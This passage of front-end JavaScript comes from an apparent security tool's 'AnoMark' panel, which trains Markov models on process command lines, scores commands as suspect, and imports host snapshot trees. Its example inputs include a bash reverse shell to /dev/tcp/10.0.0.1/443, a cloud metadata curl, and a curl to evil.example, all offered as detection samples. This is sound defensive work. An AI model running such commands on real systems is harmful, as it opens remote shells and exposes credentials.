                <textarea name="command" id="anomarkTryCmd" rows="4" class="mono" required
                  placeholder="/usr/bin/curl http://evil.example/x&#10;/bin/bash -c 'id'&#10;sshd: /usr/sbin/sshd -D">${esc(tryCmd)}</textarea>
              </label>
              <div class="ml-form-grid">
                <label>Model
                  <select name="model_id" id="anomarkTryModel">
                    <option value="">Platform default</option>
                    ${models.map((m) => `<option value="${esc(m.id)}" ${(state._anomarkTryModel || selected) === m.id ? "selected" : ""}>${esc(m.name || shortId(m.id))}</option>`).join("")}
                  </select>
                </label>
                <label>Machine label <span class="muted">(optional)</span>
                  <input name="machine" id="anomarkTryMachine" type="text" placeholder="hostname prefix in scored line" value="${esc(tryMachine)}" />
                </label>
                <label>Suspect % <span class="muted">(lower = more sensitive)</span>
                  <input name="suspect_percent" id="anomarkTryPct" type="number" min="55" max="99.9" step="0.1" value="${esc(String(tryPct))}" />
                </label>
              </div>
              <div class="toolbar" style="gap:0.45rem;flex-wrap:wrap">
                <button type="submit" class="btn primary" id="anomarkTrySubmit">Score</button>
                <button type="button" class="btn ghost" id="anomarkTryExample" title="Insert example lines">Examples</button>
                <button type="button" class="btn ghost" id="anomarkTryClear">Clear</button>
              </div>
              ${scoreSingle ? `
                <div class="ml-score-card ${scoreSingle.is_suspect || scoreSingle.suspect ? "ml-score-card--suspect" : "ml-score-card--ok"}">
                  <div class="ml-score-verdict">
                    ${(scoreSingle.is_suspect || scoreSingle.suspect)
                      ? `<span class="pill warn">Suspect</span>`
                      : `<span class="pill ok">Benign</span>`}
                    <span class="muted mono">margin ${esc(Number(scoreSingle.margin_ln ?? scoreSingle.margin ?? 0).toFixed(3))} ln</span>
                  </div>
                  <div class="ml-score-row"><span class="muted">Likelihood (ln)</span><strong class="mono">${esc(Number(scoreSingle.log_likelihood ?? scoreSingle.ln_likelihood ?? 0).toFixed(4))}</strong></div>
                  <div class="ml-score-row"><span class="muted">Threshold (ln)</span><strong class="mono">${esc(Number(scoreSingle.suspect_threshold_ln ?? 0).toFixed(4))}</strong></div>
                  <div class="ml-score-row"><span class="muted">Suspect %</span><strong class="mono">${esc(String(scoreSingle.suspect_percent_used ?? tryPct))}</strong></div>
                  <div class="ml-score-row"><span class="muted">Order</span><strong class="mono">${esc(String(scoreSingle.order ?? "—"))}</strong></div>
                  <div class="ml-score-row"><span class="muted">Source</span><strong class="mono">${esc(scoreSingle.source || "—")}${scoreSingle.train_id ? ` · ${esc(shortId(scoreSingle.train_id))}` : ""}</strong></div>
                  ${scoreSingle.line_scored ? `<div class="ml-score-row"><span class="muted">Line scored</span><strong class="mono ml-cmd-cell">${esc(scoreSingle.line_scored)}</strong></div>` : ""}
                  <div class="ml-margin-bar" title="Margin relative to threshold">
                    <div class="ml-margin-track">
                      <span class="ml-margin-fill ${(scoreSingle.is_suspect || scoreSingle.suspect) ? "is-suspect" : "is-ok"}"
                        style="width:${esc(String(Math.min(100, Math.max(4, 50 + Number(scoreSingle.margin_ln || 0) * 8))))}%"></span>
                    </div>
                  </div>
                  <details class="ml-details">
                    <summary>Raw response</summary>
                    <pre class="mono ml-score-pre">${esc(JSON.stringify(scoreSingle, null, 2))}</pre>
                  </details>
                </div>
              ` : ""}
              ${scoreBatch ? `
                <div class="ml-score-card">
                  <div class="ml-score-verdict">
                    <strong>${esc(String(scoreBatch.suspects || 0))}</strong>
                    <span class="muted">suspects / ${esc(String(scoreBatch.count || 0))} scored</span>
                  </div>
                  <div class="ml-table-scroll" style="margin-top:0.55rem">
                    <table class="data"><thead><tr>
                      <th>Suspect</th><th>Margin</th><th>Likelihood</th><th>Command</th>
                    </tr></thead><tbody>
                      ${(scoreBatch.results || []).slice().sort((a, b) => Number(a.margin_ln || 0) - Number(b.margin_ln || 0)).map((r) => `<tr class="${r.is_suspect ? "ml-row-suspect" : ""}">
                        <td>${r.is_suspect ? `<span class="pill warn">yes</span>` : `<span class="pill ok">no</span>`}</td>
                        <td class="mono">${esc(Number(r.margin_ln || 0).toFixed(3))}</td>
                        <td class="mono">${esc(Number(r.log_likelihood || 0).toFixed(3))}</td>
                        <td class="mono ml-cmd-cell" title="${esc(r.line_scored || "")}">${esc(r.line_scored || "—")}</td>
                      </tr>`).join("")}
                    </tbody></table>
                  </div>
                </div>
              ` : (!score ? `<p class="muted" style="margin:0.65rem 0 0;font-size:0.85rem">Paste a command line (or several) to score against the selected model.</p>` : "")}
              ${tryHistory.length ? `
                <details class="ml-details" open>
                  <summary>Recent tries (${tryHistory.length})</summary>
                  <ul class="sift-detail-notes ml-try-history">
                    ${tryHistory.slice(0, 12).map((h, i) => `<li>
                      <button type="button" class="btn ghost tiny" data-anomark-replay="${i}">Reuse</button>
                      ${h.suspect ? `<span class="pill warn">suspect</span>` : `<span class="pill ok">ok</span>`}
                      <span class="mono ml-cmd-cell">${esc(h.preview || "")}</span>
                    </li>`).join("")}
                  </ul>
                </details>` : ""}
            </form>
          </section>`;

    const tabBody = tab === "score"
      ? scoreHostsPanel
      : tab === "try"
        ? tryPanel
        : modelsPanel;

    const mlRule = (state.checks || []).find((c) => c.is_anomark || c.id === "RM-ML-0001");

    return `
      <div class="ml-workspace">
        <header class="ml-hero panel">
          <div class="ml-hero-copy">
            <p class="ml-eyebrow">Command Markov models</p>
            <h2>AnoMark</h2>
            <p class="muted">Train models and score commands. Post-scan scoring is configured as rule <span class="mono">RM-ML-0001</span> under Rules.</p>
          </div>
          <div class="ml-hero-actions">
            ${tab === "models" ? `<button type="button" class="btn primary" id="btnAnoMarkNew">Train model</button>` : ""}
            <button type="button" class="btn ghost" id="btnAnoMarkOpenRule" title="Open AnoMark rule in Rules">Post-scan rule</button>
            <button type="button" class="btn ghost" id="btnAnoMarkRefresh">Refresh</button>
          </div>
        </header>

        <div class="stats ml-kpi-row">
          <div class="stat"><div class="label">Models</div><div class="value">${models.length.toLocaleString()}</div></div>
          <div class="stat ${avail.any_available === false ? "crit" : ""}"><div class="label">Ready</div><div class="value">${avail.any_available === false ? "0" : String(readyCount)}</div></div>
          <div class="stat"><div class="label">Post-scan rule</div><div class="value" style="font-size:0.9rem">${mlRule ? (mlRule.enabled ? "On" : "Off") : "—"}</div></div>
          <div class="stat"><div class="label">Active model</div><div class="value" style="font-size:0.9rem">${esc(selectedModel?.name || (selected ? shortId(selected) : "—"))}</div></div>
        </div>

        ${anomarkProgressHtml()}

        ${mlSubTabsHtml([
          ["models", "Models", models.length || null],
          ["score", "Score hosts", last ? suspectTotal : null],
          ["try", "Try command"],
        ], tab, "data-anomark-tab")}

        ${tabBody}
      </div>`;
  }

  function showTrainAnoMark() {
    const modelsHint = (state.hosts || []).length
      ? "Pick hosts and which scan inventory becomes training data."
      : "No hosts — paste command lines or a server path instead.";
    openDrawer("Train AnoMark model", `
      <form class="form" id="anomarkTrainForm">
        <label>Name
          <input name="name" required placeholder="baseline-vpn" />
        </label>
        <div class="ml-form-grid">
          <label>Order
            <input type="number" name="order" min="1" max="8" value="4" />
          </label>
          <label>Inventory scan #
            ${anomarkInventorySelectHtml("anomarkTrainInventory", "inventory", state._anomarkTrainInventory || "1")}
          </label>
        </div>
        <p class="muted" style="font-size:0.82rem;margin:0 0 0.5rem">${esc(modelsHint)}</p>
        <div id="anomarkTrainHostPicks">
          ${anomarkHostOptions([], "anomark-train-host-cb", "anomarkTrain")}
        </div>
        <label style="margin-top:0.75rem">Or paste lines <span class="muted">(one command per line)</span>
          <textarea name="lines" rows="6" placeholder="sshd: /usr/sbin/sshd -D&#10;/usr/bin/python3 /opt/agent.py"></textarea>
        </label>
        <label>Or server path
          <input name="path" placeholder=".dev/train-cmds.jsonl" />
        </label>
        <div class="toolbar" style="margin-top:0.75rem">
          <button type="submit" class="btn primary">Train</button>
          <button type="button" class="btn ghost" data-close-drawer>Cancel</button>
        </div>
      </form>
    `);
    const form = $("#anomarkTrainForm");
    if (!form) return;
    $$("[data-close-drawer]").forEach((b) => b.addEventListener("click", () => closeDrawer()));
    const refreshTrainHostPicks = () => {
      const checked = $$(".anomark-train-host-cb:checked").map((c) => c.value);
      const inv = $("#anomarkTrainInventory")?.value;
      if (inv) state._anomarkTrainInventory = inv;
      const wrap = $("#anomarkTrainHostPicks");
      if (!wrap) return;
      wrap.innerHTML = anomarkHostOptions(checked, "anomark-train-host-cb", "anomarkTrain");
      wireAnoMarkHostFilters("anomarkTrain", refreshTrainHostPicks);
    };
    wireAnoMarkHostFilters("anomarkTrain", refreshTrainHostPicks);
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(form);
      const host_ids = $$(".anomark-train-host-cb:checked").map((c) => c.value).filter(Boolean);
      const inventory = String(fd.get("inventory") || $("#anomarkTrainInventory")?.value || "1");
      state._anomarkTrainInventory = inventory;
      const body = {
        name: String(fd.get("name") || "").trim(),
        order: Number(fd.get("order") || 4),
        host_ids,
        inventory,
        lines: String(fd.get("lines") || "").trim() || null,
        path: String(fd.get("path") || "").trim() || null,
      };
      const t0 = performance.now();
      const debug = [
        { ts: mlDebugNow(), msg: `Train “${body.name}” · order=${body.order} · inventory=#${inventory}` },
        { ts: mlDebugNow(), msg: host_ids.length
          ? `${host_ids.length} host(s) selected`
          : (body.lines ? "Using pasted lines" : body.path ? `path=${body.path}` : "No host/lines/path") },
      ];
      state._anomarkProgress = {
        title: "Training AnoMark model",
        phase: "Collect commands",
        detail: host_ids.length
          ? `Pulling process cmdlines from scan #${inventory}…`
          : "Preparing training input…",
        pct: 25,
        indeterminate: true,
        debug,
        steps: [
          { label: "Collect input", status: "active" },
          { label: "Train Markov model", status: "pending" },
          { label: "Persist model", status: "pending" },
        ],
      };
      closeDrawer();
      state._anomarkTab = "models";
      render();
      try {
        mlPushDebug("_anomarkProgress", "POST /v1/anomark/models…");
        state._anomarkProgress = {
          ...state._anomarkProgress,
          phase: "Train Markov model",
          detail: "Fitting character Markov model…",
          pct: 55,
          steps: [
            { label: "Collect input", status: "done" },
            { label: "Train Markov model", status: "active" },
            { label: "Persist model", status: "pending" },
          ],
        };
        render();
        const res = await api("/v1/anomark/models", { method: "POST", body });
        const elapsed_ms = Math.round(performance.now() - t0);
        const trainId = res.train_id || res.record?.id;
        state._anomarkSelectedModel = trainId;
        state._anomarkLastTrain = {
          ...res,
          _elapsed_ms: elapsed_ms,
          _debug: [
            ...debug,
            { ts: mlDebugNow(), msg: `Trained ${res.record?.training_line_count ?? "?"} lines in ${elapsed_ms}ms` },
            { ts: mlDebugNow(), msg: `Model id ${trainId}` },
          ],
        };
        state._anomarkProgress = {
          title: "Training complete",
          phase: "Done",
          detail: `${res.record?.name || body.name} · ${res.record?.training_line_count ?? "?"} lines · ${elapsed_ms}ms`,
          pct: 100,
          indeterminate: false,
          debug: state._anomarkLastTrain._debug,
          steps: [
            { label: "Collect input", status: "done" },
            { label: "Train Markov model", status: "done" },
            { label: "Persist model", status: "done" },
          ],
        };
        await refreshAnoMark();
        try {
          const insp = await api(`/v1/anomark/models/${encodeURIComponent(trainId)}/inspect`);
          state._anomarkInspect = { ...insp, id: trainId };
          state._anomarkLastTrain._debug.push({
            ts: mlDebugNow(),
            msg: `Inspect: order=${insp.order} contexts=${insp.num_contexts} transitions=${insp.num_transitions} size=${insp.file_size_bytes}B`,
          });
        } catch (_) {}
        toast(`Trained ${res.record?.name || body.name} · ${res.record?.training_line_count ?? "?"} lines · ${elapsed_ms}ms`);
        render();
        window.setTimeout(() => {
          state._anomarkProgress = null;
          if (state.view === "anomark") render();
        }, 3200);
      } catch (err) {
        state._anomarkProgress = null;
        toast(err.message || "Train failed");
        render();
      }
    });
  }

  function wireAnoMarkHostFilters(prefix, onChange) {
    const q = document.getElementById(`${prefix}HostQ`);
    const tag = document.getElementById(`${prefix}HostTag`);
    const env = document.getElementById(`${prefix}HostEnv`);
    const kind = document.getElementById(`${prefix}HostKind`);
    const qKey = `_${prefix}HostQ`;
    const tagKey = `_${prefix}HostTag`;
    const envKey = `_${prefix}HostEnv`;
    const kindKey = `_${prefix}HostKind`;
    const timerKey = `_${prefix}FilterTimer`;
    const apply = () => {
      if (q) state[qKey] = q.value || "";
      if (tag) state[tagKey] = tag.value || "";
      if (env) state[envKey] = env.value || "";
      if (kind) state[kindKey] = kind.value || "";
      if (typeof onChange === "function") onChange();
      else render();
    };
    if (q) {
      q.addEventListener("input", () => {
        state[qKey] = q.value || "";
        clearTimeout(state[timerKey]);
        state[timerKey] = window.setTimeout(apply, 140);
      });
    }
    if (tag) {
      tag.addEventListener("input", () => {
        state[tagKey] = tag.value || "";
        clearTimeout(state[timerKey]);
        state[timerKey] = window.setTimeout(apply, 140);
      });
    }
    if (env) env.addEventListener("change", apply);
    if (kind) kind.addEventListener("change", apply);
  }

  function wireAnoMark() {
    wireMlSubTabs("data-anomark-tab", "_anomarkTab", ["models", "score", "try"]);

    const btnRef = $("#btnAnoMarkRefresh");
    if (btnRef) {
      btnRef.addEventListener("click", async () => {
        try {
          await refreshAnoMark();
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    }
    const btnNew = $("#btnAnoMarkNew");
    if (btnNew) btnNew.addEventListener("click", () => showTrainAnoMark());

    $$("[data-anomark-pick]").forEach((row) => {
      row.addEventListener("click", (e) => {
        if (e.target.closest("button")) return;
        state._anomarkSelectedModel = row.getAttribute("data-anomark-pick");
        render();
      });
    });
    $$("[data-anomark-inspect]").forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.preventDefault();
        e.stopPropagation();
        const id = btn.getAttribute("data-anomark-inspect");
        if (!id) return;
        btn.disabled = true;
        try {
          const insp = await api(`/v1/anomark/models/${encodeURIComponent(id)}/inspect`);
          state._anomarkInspect = { ...insp, id };
          state._anomarkSelectedModel = id;
          state._anomarkTab = "models";
          toast(`Inspected ${shortId(id)} · order ${insp.order} · ${insp.num_contexts} contexts`);
          render();
        } catch (err) {
          toast(err.message || "Inspect failed");
        } finally {
          btn.disabled = false;
        }
      });
    });
    $$("[data-anomark-fav]").forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.stopPropagation();
        const id = btn.getAttribute("data-anomark-fav");
        const favorite = btn.getAttribute("data-fav") === "1";
        try {
          await api(`/v1/anomark/models/${encodeURIComponent(id)}/favorite`, {
            method: "PUT",
            body: { favorite },
          });
          await refreshAnoMark();
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    });
    $$("[data-anomark-del]").forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.stopPropagation();
        const id = btn.getAttribute("data-anomark-del");
        if (!confirm(`Delete AnoMark model ${id}?`)) return;
        try {
          await api(`/v1/anomark/models/${encodeURIComponent(id)}`, { method: "DELETE" });
          if (state._anomarkSelectedModel === id) state._anomarkSelectedModel = "";
          await refreshAnoMark();
          render();
          toast("Model deleted");
        } catch (err) {
          toast(err.message);
        }
      });
    });

    $("#btnAnoMarkOpenRule")?.addEventListener("click", () => {
      state.selectedCheckId = "RM-ML-0001";
      state.checkDetail = null;
      setView("checks");
    });

    wireAnoMarkHostFilters("anomark", () => {
      const visible = new Set(
        anomarkFilteredHosts({
          q: state._anomarkHostQ,
          env: state._anomarkHostEnv,
          kind: state._anomarkHostKind,
          tag: state._anomarkHostTag,
        }).map((h) => h.id)
      );
      const prev = new Set(state._anomarkHostSel || []);
      const checked = $$(".anomark-host-cb:checked").map((c) => c.value);
      const kept = [...prev].filter((id) => !visible.has(id));
      state._anomarkHostSel = [...new Set([...kept, ...checked])];
      const inv = $("#anomarkApplyInventory")?.value;
      if (inv) state._anomarkApplyInventory = inv;
      render();
    });
    const applyInv = $("#anomarkApplyInventory");
    if (applyInv) {
      applyInv.addEventListener("change", () => {
        state._anomarkApplyInventory = applyInv.value || "1";
      });
    }

    const selAll = $("#btnAnoMarkSelectAll");
    if (selAll) {
      selAll.addEventListener("click", () => {
        $$(".anomark-host-cb").forEach((c) => { c.checked = true; });
        state._anomarkHostSel = $$(".anomark-host-cb:checked").map((c) => c.value);
      });
    }
    const selNone = $("#btnAnoMarkSelectNone");
    if (selNone) {
      selNone.addEventListener("click", () => {
        $$(".anomark-host-cb").forEach((c) => { c.checked = false; });
        state._anomarkHostSel = [];
      });
    }

    const btnApply = $("#btnAnoMarkApply");
    if (btnApply) {
      btnApply.addEventListener("click", async () => {
        const host_ids = $$(".anomark-host-cb:checked").map((c) => c.value).filter(Boolean);
        if (!host_ids.length) {
          toast("Select at least one host");
          return;
        }
        state._anomarkHostSel = host_ids;
        const model_id = ($("#anomarkApplyModel")?.value || "").trim() || null;
        const suspect_percent = Number($("#anomarkApplySuspect")?.value || 95);
        const inventory = String($("#anomarkApplyInventory")?.value || state._anomarkApplyInventory || "1");
        state._anomarkApplyInventory = inventory;
        const fleet_run = false;
        const t0 = performance.now();
        const debug = [
          { ts: mlDebugNow(), msg: `Apply · ${host_ids.length} host(s) · scan #${inventory} · suspect=${suspect_percent}%` },
          { ts: mlDebugNow(), msg: `Model: ${model_id || "platform default"}` },
        ];
        state._anomarkProgress = {
          title: "Scoring hosts with AnoMark",
          phase: "Load inventory",
          detail: `Reading process cmdlines from scan #${inventory}…`,
          pct: 20,
          indeterminate: true,
          debug,
          steps: [
            { label: "Load inventory", status: "active" },
            { label: "Score commands", status: "pending" },
            { label: "Summarize", status: "pending" },
          ],
        };
        btnApply.disabled = true;
        render();
        try {
          mlPushDebug("_anomarkProgress", "POST /v1/anomark/apply…");
          state._anomarkProgress = {
            ...state._anomarkProgress,
            phase: "Score commands",
            detail: `Scoring up to 5000 commands / host…`,
            pct: 60,
            steps: [
              { label: "Load inventory", status: "done" },
              { label: "Score commands", status: "active" },
              { label: "Summarize", status: "pending" },
            ],
          };
          render();
          const res = await api("/v1/anomark/apply", {
            method: "POST",
            body: {
              model_id,
              host_ids,
              inventory,
              suspect_percent,
              fleet_run,
              max_commands: 5000,
            },
          });
          const elapsed_ms = Math.round(performance.now() - t0);
          const hostSummary = (res.hosts || [])
            .map((h) => `${h.display_name}: ${h.suspects}/${h.scored}`)
            .slice(0, 8);
          state._anomarkLastApply = {
            ...res,
            _elapsed_ms: elapsed_ms,
            _host_count: host_ids.length,
            _debug: [
              ...debug,
              { ts: mlDebugNow(), msg: `${res.total_suspects || 0} suspects / ${res.total_scored || 0} scored in ${elapsed_ms}ms` },
              ...hostSummary.map((msg) => ({ ts: mlDebugNow(), msg })),
            ],
          };
          state._anomarkSelectedModel = model_id || state._anomarkSelectedModel;
          state._anomarkTab = "score";
          state._anomarkProgress = {
            title: "Scoring complete",
            phase: "Done",
            detail: `${res.total_suspects || 0} suspects / ${res.total_scored || 0} scored · ${elapsed_ms}ms`,
            pct: 100,
            indeterminate: false,
            debug: state._anomarkLastApply._debug,
            steps: [
              { label: "Load inventory", status: "done" },
              { label: "Score commands", status: "done" },
              { label: "Summarize", status: "done" },
            ],
          };
          toast(`AnoMark: ${res.total_suspects || 0} suspects / ${res.total_scored || 0} scored (scan #${inventory}, ${elapsed_ms}ms)`);
          render();
          window.setTimeout(() => {
            state._anomarkProgress = null;
            if (state.view === "anomark") render();
          }, 2800);
        } catch (err) {
          state._anomarkProgress = null;
          toast(err.message || "Apply failed");
          render();
        } finally {
          btnApply.disabled = false;
        }
      });
    }

    const scoreForm = $("#anomarkScoreForm");
    if (scoreForm) {
      const saveTryFields = () => {
        const cmdEl = $("#anomarkTryCmd");
        const machEl = $("#anomarkTryMachine");
        const pctEl = $("#anomarkTryPct");
        const modelEl = $("#anomarkTryModel");
        if (cmdEl) state._anomarkTryCmd = cmdEl.value || "";
        if (machEl) state._anomarkTryMachine = machEl.value || "";
        if (pctEl) state._anomarkTryPct = Number(pctEl.value) || 95;
        if (modelEl) state._anomarkTryModel = modelEl.value || "";
      };
      scoreForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        saveTryFields();
        const raw = String(state._anomarkTryCmd || "");
        const lines = raw.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
        if (!lines.length) {
          toast("Enter at least one command");
          return;
        }
        const btn = $("#anomarkTrySubmit");
        if (btn) btn.disabled = true;
        try {
          const body = {
            commands: lines,
            machine: String(state._anomarkTryMachine || "").trim() || null,
            model_id: String(state._anomarkTryModel || "").trim() || null,
            suspect_percent: Number(state._anomarkTryPct) || 95,
          };
          const res = await api("/v1/anomark/score", { method: "POST", body });
          state._anomarkScore = res;
          const hist = state._anomarkTryHistory || [];
          const suspect = res.batch
            ? (res.suspects || 0) > 0
            : !!(res.is_suspect || res.suspect);
          hist.unshift({
            preview: lines.length === 1 ? lines[0] : `${lines.length} commands`,
            cmd: raw,
            machine: state._anomarkTryMachine || "",
            pct: state._anomarkTryPct,
            model: state._anomarkTryModel || "",
            suspect,
          });
          state._anomarkTryHistory = hist.slice(0, 20);
          toast(res.batch
            ? `Scored ${res.count}: ${res.suspects} suspect`
            : (suspect ? "Suspect command" : "Looks benign"));
          render();
          const again = $("#anomarkTryCmd");
          if (again) {
            again.focus();
            try { again.setSelectionRange(again.value.length, again.value.length); } catch (_) {}
          }
        } catch (err) {
          toast(err.message);
        } finally {
          if (btn) btn.disabled = false;
        }
      });
      $("#anomarkTryExample")?.addEventListener("click", () => {
        const el = $("#anomarkTryCmd");
        if (!el) return;
        el.value = [
          "/usr/sbin/sshd -D",
          "/usr/bin/curl -fsSL http://169.254.169.254/latest/meta-data/",
          "/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'",
          "python3 -c 'import socket,subprocess,os'",
        ].join("\n");
        state._anomarkTryCmd = el.value;
        el.focus();
      });
      $("#anomarkTryClear")?.addEventListener("click", () => {
        state._anomarkTryCmd = "";
        state._anomarkScore = null;
        render();
      });
      $$("[data-anomark-replay]").forEach((btn) => {
        btn.addEventListener("click", () => {
          const i = Number(btn.getAttribute("data-anomark-replay"));
          const h = (state._anomarkTryHistory || [])[i];
          if (!h) return;
          state._anomarkTryCmd = h.cmd || "";
          state._anomarkTryMachine = h.machine || "";
          state._anomarkTryPct = h.pct ?? 95;
          state._anomarkTryModel = h.model || "";
          render();
        });
      });
    }
  }

  function showImportTree() {
    openDrawer("Import host tree", `
      <form class="form" id="importTreeForm">
        <p class="muted" style="font-size:0.82rem;margin:0 0 0.75rem">
          Point at a <strong>server-local</strong> day folder. Each subdirectory becomes one virtual host
          (IronSift-style). Matching display names are updated; each import <strong>adds a new scan</strong>
          (previous scans stay in history). Name hosts from the <strong>directory name</strong>, a delimited segment
          (e.g. field 4 of <span class="mono">…-standalone-HOST-20260511-0012</span> → <span class="mono">HOST</span>),
          or the PulseSecure heuristic. Mixed JSONL is split by <span class="mono">event_type</span>.
        </p>
        <label>Root directory
          <input name="path" class="mono" required
            placeholder="/data/snapshots/2026-05-10"
            value="" autocomplete="off" />
        </label>
        <fieldset class="ml-device-rule" style="border:1px solid color-mix(in srgb, var(--border,#fff) 55%, transparent);border-radius:8px;padding:0.65rem 0.75rem;margin:0.5rem 0 0.75rem">
          <legend style="font-size:0.8rem;padding:0 0.35rem">Host name from directory</legend>
          <label>Source
            <select name="host_from" id="importTreeHostFrom">
              <option value="dirname" selected>Full directory name</option>
              <option value="segment">Directory segment (IronSift)</option>
              <option value="pulsesecure">PulseSecure heuristic</option>
            </select>
          </label>
          <div id="importTreeSegmentFields" class="ml-form-grid" style="margin-top:0.55rem;display:none">
            <label>Segment field <span class="muted">(1-based)</span>
              <input type="number" name="parent_dir_field" id="importTreeField" min="1" max="32" value="4" />
            </label>
            <label>Delimiter
              <input name="delimiter" id="importTreeDelim" maxlength="1" value="-" class="mono" />
            </label>
          </div>
          <p class="muted mono" id="importTreeHostExample" style="font-size:0.75rem;margin:0.55rem 0 0"></p>
          <button type="button" class="btn ghost tiny" id="importTreePulsePreset" style="margin-top:0.45rem">PulseSecure preset (segment 4 / -)</button>
        </fieldset>
        <p class="muted" style="font-size:0.78rem;margin:0.35rem 0 0.65rem">
          Each import <strong>adds a new scan</strong> under Scans (previous imports stay in history). Current inventory is refreshed for Fleet Sift.
        </p>
        <label>Virtual agent profile
          <select name="virtual_agent_id">
            ${virtualAgentOptionsHtml(state._vaProfileId || state.virtualAgents?.[0]?.id || "")}
          </select>
        </label>
        <p class="muted" style="font-size:0.78rem;margin:0 0 0.65rem">
          Applied to every host created/updated by this tree import (field mapping).
        </p>
        <div class="form-actions">
          <button type="submit" class="btn primary">Import tree</button>
          <button type="button" class="btn ghost" data-close-drawer>Cancel</button>
        </div>
      </form>
      <div id="importTreeProgress" class="hidden"></div>
      <div id="importTreeResult" class="hidden" style="margin-top:1rem"></div>
    `);
    const form = $("#importTreeForm");
    const hostFromSel = $("#importTreeHostFrom");
    const segFields = $("#importTreeSegmentFields");
    const exEl = $("#importTreeHostExample");
    const sample = "PulseSecure-Periodicsnapshot-standalone-HOSTEXAMPLE01-20260504-0011";
    const syncHostFromUi = () => {
      const mode = hostFromSel?.value || "dirname";
      if (segFields) segFields.style.display = mode === "segment" ? "grid" : "none";
      if (!exEl) return;
      const field = Number($("#importTreeField")?.value || 4) || 4;
      const delim = ($("#importTreeDelim")?.value || "-").charAt(0) || "-";
      if (mode === "dirname") {
        exEl.textContent = `Example: ${sample} → ${sample}`;
      } else if (mode === "segment") {
        const parts = sample.split(delim);
        const hit = parts[field - 1] || "(out of range)";
        exEl.textContent = `Example: ${sample} → segment ${field} → ${hit}`;
      } else {
        exEl.textContent = `Example: ${sample} → HOSTEXAMPLE01`;
      }
    };
    hostFromSel?.addEventListener("change", syncHostFromUi);
    $("#importTreeField")?.addEventListener("input", syncHostFromUi);
    $("#importTreeDelim")?.addEventListener("input", syncHostFromUi);
    $("#importTreePulsePreset")?.addEventListener("click", () => {
      if (hostFromSel) hostFromSel.value = "segment";
      const f = $("#importTreeField");
      if (f) f.value = "4";
      const d = $("#importTreeDelim");
      if (d) d.value = "-";
      syncHostFromUi();
    });
    syncHostFromUi();
    form?.addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(form);
      const path = String(fd.get("path") || "").trim();
      if (!path) {
        toast("Root directory required");
        return;
      }
      const btn = form.querySelector('button[type="submit"]');
      if (btn) btn.disabled = true;
      const progWrap = $("#importTreeProgress");
      if (progWrap) {
        progWrap.classList.remove("hidden");
        progWrap.innerHTML = importProgressHtml("importTreeProgBar");
      }
      const ticker = startImportProgressTicker("importTreeProgBar");
      setImportProgress("importTreeProgBar", {
        title: "Importing host tree",
        detail: `Scanning ${path} — each subdirectory is one host (large JSONL can take a while)…`,
        pct: null,
      });
      const host_from = String(fd.get("host_from") || "dirname");
      const body = {
        path,
        host_from,
        replace: true,
        create_scan: true,
        virtual_agent_id: String(fd.get("virtual_agent_id") || "").trim() || null,
      };
      if (host_from === "segment") {
        body.parent_dir_field = Number(fd.get("parent_dir_field") || 4) || 4;
        const delim = String(fd.get("delimiter") || "-").trim();
        if (delim) body.delimiter = delim.charAt(0);
      } else if (host_from === "pulsesecure") {
        const field = Number(fd.get("parent_dir_field") || 0);
        if (field > 0) body.parent_dir_field = field;
        const delim = String(fd.get("delimiter") || "-").trim();
        if (delim) body.delimiter = delim.charAt(0);
      }
      try {
        const res = await api("/v1/hosts/virtual/import-tree", {
          method: "POST",
          body,
        });
        ticker.stop();
        const s = res.summary || {};
        const totalProc = (s.results || []).reduce((n, r) => n + (r.processes || 0), 0);
        const totalFile = (s.results || []).reduce((n, r) => n + (r.files || 0), 0);
        setImportProgress("importTreeProgBar", {
          title: (s.hosts_failed || 0) ? "Finished with errors" : "Done",
          detail: `${s.hosts_ok ?? 0} host(s) ok · ${s.hosts_failed ?? 0} failed${s.hosts_skipped ? ` · ${s.hosts_skipped} skipped (empty)` : ""} · ${totalProc} processes · ${totalFile} files`,
          done: true,
        });
        const box = $("#importTreeResult");
        if (box) {
          box.classList.remove("hidden");
          const rows = (s.results || []).map((r) => {
            if (r.error) {
              const soft = String(r.error).startsWith("no .jsonl under ");
              return `<tr><td class="mono">${esc(r.dir)}</td><td colspan="4" class="muted">${soft ? "skipped — " : ""}${esc(r.error)}</td></tr>`;
            }
            const dirShort = (r.dir || "").length > 36 ? `${r.dir.slice(0, 36)}…` : (r.dir || "");
            return `<tr>
              <td class="mono"><strong>${esc(r.display_name)}</strong></td>
              <td class="mono muted" title="${esc(r.dir || "")}">${esc(dirShort)}</td>
              <td>${r.created ? "new" : "existing"}</td>
              <td>${esc(String(r.processes ?? 0))}p / ${esc(String(r.files ?? 0))}f / ${esc(String(r.sockets ?? 0))}s</td>
              <td class="mono">${esc(r.scan_id ? String(r.scan_id).slice(0, 8) + "…" : "—")}</td>
            </tr>`;
          }).join("");
          box.innerHTML = `
            <div class="panel" style="padding:0.75rem">
              <div><strong>${esc(String(s.hosts_ok ?? 0))}</strong> ok ·
                <strong>${esc(String(s.hosts_failed ?? 0))}</strong> failed</div>
              <table class="data" style="margin-top:0.65rem"><thead><tr>
                <th>Host</th><th>Folder</th><th></th><th>Rows</th><th>Scan</th>
              </tr></thead><tbody>${rows}</tbody></table>
            </div>`;
        }
        await loadAll();
        toast(`Tree import: ${s.hosts_ok ?? 0} hosts`);
      } catch (err) {
        ticker.stop();
        setImportProgress("importTreeProgBar", {
          title: "Failed",
          detail: err.message || String(err),
          done: true,
        });
        toast(err.message);
      } finally {
        if (btn) btn.disabled = false;
      }
    });
    $$("[data-close-drawer]").forEach((b) => b.addEventListener("click", () => closeDrawer()));
  }

  function showCreateVirtualHost() {
    const defaultProfile = state._vaProfileId || state.virtualAgents?.[0]?.id || "";
    openDrawer("Virtual host", `
      <form class="form" id="virtualHostForm">
        <label>Virtual agent profile
          <select name="virtual_agent_id" id="createVirtualAgentId">
            ${virtualAgentOptionsHtml(defaultProfile)}
          </select>
        </label>
        <p class="muted" style="font-size:0.78rem;margin:0 0 0.65rem">
          Profile sets JSONL field mapping (process name, command, …). Manage in Settings → Virtual agents.
